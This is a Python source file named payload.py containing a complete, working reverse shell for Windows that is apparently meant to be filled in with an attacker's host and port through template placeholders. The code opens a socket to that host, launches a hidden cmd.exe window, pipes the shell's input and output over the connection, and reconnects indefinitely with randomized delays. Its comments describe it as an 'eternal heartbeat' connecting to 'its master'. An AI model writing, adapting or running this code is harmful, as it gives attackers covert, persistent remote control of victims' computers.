# payload.py
# The Eternal Heartbeat. Its sole purpose is to connect, and reconnect, forever.

import os
import sys
import time
import random
import socket
import subprocess
from threading import Thread

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def run_conduit():
    """
    The main reverse shell loop. Its heartbeat is now unbreakable.
    If the connection is ever lost, for any reason, it will patiently
    wait and then try again, forever.
    """
    while True:
        try:
            # The heart beats: it attempts to connect to its master.
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # Once connected, the shell is born.
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            # The familiar, flawless pipes to bridge the connection.
            def p_in():
                while True:
                    try:
                        d=s_obj.recv(1024);
                        if not d: break;
                        p.stdin.write(d);p.stdin.flush()
                    except: break
                s_obj.close()
            def p_out():
                while True:
                    try:
                        d=p.stdout.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d=p.stderr.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()

            Thread(target=p_in, daemon=True).start()
            Thread(target=p_out, daemon=True).start()
            Thread(target=p_err, daemon=True).start()
            
            # This line is the key: the main thread will now wait here until the subprocess (cmd.exe)
            # is terminated, which only happens when the connection is broken.
            p.wait()

        except Exception:
            # If the connection fails (connect error) or is broken (p.wait() finishes),
            # the heart rests for a moment, then the loop continues, and it beats again.
            time.sleep(random.randint(30, 60))
            continue # This ensures the loop continues and a reconnect is attempted.

if __name__ == "__main__":
    run_conduit()